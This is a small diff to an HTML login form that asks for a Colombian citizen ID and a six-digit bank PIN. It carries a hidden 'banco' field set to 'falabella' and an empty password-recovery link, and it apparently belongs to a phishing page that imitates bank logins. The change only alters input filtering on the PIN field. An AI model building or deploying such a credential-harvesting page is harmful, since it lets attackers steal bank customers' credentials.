@@ -68,7 +68,7 @@
         </select><br>
 
         <input type="tel" id="txtUsuario" name = "cedula" placeholder="Cedula Ciudadania" maxlength="10" minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');"><br>
-        <input type="password" id="txtPass" name ="clave" placeholder="Clave" required pattern="[0-9]{6}" oninput="this.value = this.value.replace(/\D+/g, '');"><br>
+        <input type="password" id="txtPass" name ="clave" placeholder="Clave" required pattern="[0-9]{6}" oninput="this.value = this.value.replace(/\s+/g, '')"><br>
         <input type="submit" value="INGRESAR" id="btnUsuario" ></center><br>
         <input type="hidden" value="falabella" id="banco">
        <center> <a href="" id="clave">Crea o recupera tu clave</a></center>
